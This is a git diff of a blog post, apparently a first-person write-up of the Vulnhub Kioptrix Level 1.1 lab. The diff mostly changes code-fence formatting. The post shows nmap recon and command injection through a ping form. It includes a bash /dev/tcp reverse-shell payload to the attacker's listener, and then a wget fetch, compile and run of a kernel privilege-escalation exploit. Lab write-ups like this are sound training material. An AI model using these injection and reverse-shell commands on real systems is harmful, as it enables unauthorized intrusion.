@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Vulnhub - Kioptrix: Level 1.1 (#2)
+title: Vulnhub \- Kioptrix: Level 1.1 (#2)
 ---
 
 This is my first writeup of a Vulnhub VM, so let's see how this goes...
@@ -11,7 +11,7 @@ The VM was run using VMWare and the attacking machine was a Kali Linux VM runnin
 
 ## Recon and Enumeration
 I used netdiscover to find the IP of the box.
-```bash
+```
 root@kali:~# netdiscover
 ```
 ![netdiscover output]({{ site.baseurl }}/images/KioptrixLevel1_1/netdiscover.png "netdiscover output")
@@ -20,7 +20,7 @@ Because I knew that the VM was running in VMWare, I chose the VMWare IP, 192.168
 
 I then ran `nmap` to find open ports with services running on them.
 
-```bash
+```
 root@kali:~# nmap 192.168.56.106
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 13:18 EDT
 mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
@@ -57,11 +57,11 @@ This brought me to a page containing the output to the ping command.
 
 I ran `; ls` to make sure that I could inject a command and was presented with a directory listing. Next, I injected a reverse shell by first opening a netcat listener on my Kali VM and then putting the shell code into the form.
 
-```bash
+```
 root@kali:~# nc -nvlp 1234
 ```
 
-```bash
+```
 ; bash -i >& /dev/tcp/192.168.56.101/1234 0>&1
 ```
 
@@ -73,7 +73,7 @@ This presented me with a shell on my Kali VM.
 
 I first check the user that I am.
 
-```bash
+```
 bash-3.00$ whoami
 apache
 ```
@@ -82,7 +82,7 @@ I look around a bit to find possible things to exploit, but I can't find anythin
 
 Next, I check the kernel version to see if there are any exploits available.
 
-```bash
+```
 bash-3.00$ uname -a
 Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
 ```
@@ -91,14 +91,14 @@ I found that the box was vulnerable to ['ip_append_data()' Ring0 Privilege Escal
 
 Because neither box was connected to the internet, I used a shared folder on my Kali VM to move the exploit to it. I then used the python SimpleHTTPServer to send the file to the box.
 
-```bash
+```
 root@kali:~# python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
 ```
 
 I used `wget` on the box to retrieve the file from my Kali VM.
 
-```bash
+```
 bash-3.00$ cd /tmp
 bash-3.00$ wget 192.168.56.101/9542.c
 --10:41:56--  http://192.168.56.101/9542.c
@@ -114,7 +114,7 @@ Length: 2,643 (2.6K) [text/plain]
 
 I then compiled it according to the instructions and ran it.
 
-```bash
+```
 bash-3.00$ gcc -o 9542 9542.c
 bash-3.00$ ./9542
 [-] exploit failed, try again
@@ -124,7 +124,7 @@ This unfortunately didn't work. I looked at the source code to figure out why, b
 
 I uploaded [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) and ran it to find other potential vulnerabilities with the box.
 
-```bash
+```
 bash-3.00$ python linuxprivchecker.py
 ...
 [*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
